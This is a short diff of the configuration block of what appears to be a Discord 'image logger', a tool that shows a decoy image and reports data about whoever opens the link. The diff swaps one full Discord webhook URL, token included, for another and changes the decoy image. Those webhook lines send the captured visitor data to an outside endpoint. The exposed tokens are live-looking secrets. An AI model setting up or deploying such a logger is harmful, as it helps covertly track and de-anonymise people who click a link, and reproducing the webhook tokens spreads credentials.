@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discordapp.com/api/webhooks/1334747573843525663/6e0Athz3yFnx3nVwfk-TRVIJTf_UcQqHVbpfUGl3B8YXcamsOpje-k8NwiT-R1JK5xRe",
-    "image": "https://static.wikia.nocookie.net/villains/images/3/33/Retep.png/revision/latest?cb=20230624040347", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1397723585111396392/YIEjDR0ODHSkvgA2A5LkFVSgkARjURBjbwSrtpl2GtVLyrTNWOyBZ9cwURpSkdkD9qqS",
+    "image": "https://i.pinimg.com/736x/5f/5a/44/5f5a4429d5c9fc9587da71110918fbf5.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
